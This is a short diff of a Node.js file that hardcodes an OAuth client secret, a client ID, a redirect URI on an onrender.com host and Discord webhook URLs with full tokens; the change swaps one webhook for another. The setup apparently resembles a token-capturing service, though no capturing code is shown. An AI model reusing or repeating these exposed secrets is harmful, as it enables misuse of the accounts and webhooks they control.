@@ -2,7 +2,7 @@
 const client_secret = 'sSr8Q~CTnEfRugLqSfFTto8mItU7G.t5bPoCGbE7'
 const client_id = 'abccc5df-81ab-4830-b33d-43d8e266130c'
 const redirect_uri = 'https://mcloverrr.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1078521930669363251/VMCtKjAp6h6RHL6FMr13p7_EGDLltwPwm3KzjdlXGBFD5S1k_bDnwMLY4xcoiZu6m_1B'
+const webhook_url = 'https://discord.com/api/webhooks/1166215459620790323/LbManmLloK_XnbQ4QZaIoxp_ZEoTs9ql_6dg5LytHUjgxjtdqCuo1tTEz-ka7Di8ajQx'
 //Requirements
 const axios = require('axios')
 const express = require('express')
